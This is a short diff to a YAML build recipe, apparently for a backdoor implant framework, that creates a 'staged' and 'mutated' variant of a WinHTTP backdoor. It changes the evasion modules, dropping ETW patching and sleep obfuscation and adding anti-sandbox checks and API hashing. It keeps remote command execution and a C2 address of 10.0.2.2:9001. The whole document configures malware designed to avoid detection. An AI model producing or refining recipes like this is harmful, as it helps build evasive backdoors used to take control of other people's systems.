@@ -1,4 +1,4 @@
-name: backdoor_cs_winhttp_v1
+name: bd_winhttp_staged_v1_mutated
 description: Auto-generated recipe by Hermes (c)
 core:
 - core/emit_buffer
@@ -14,11 +14,10 @@ commands:
 - commands/cmd_processes
 - commands/cmd_exec
 resources: true
-api_resolve: api_resolve/api_hash_ror13
+api_resolve: evasion/api_hash
 evasion:
-- evasion/etw_patch
-- evasion/sleep_ekko
-- evasion/debug_dir_strip
+- evasion/anti_sandbox
+- evasion/api_hash
 vars:
   C2_IP: 10.0.2.2
   C2_PORT: '9001'
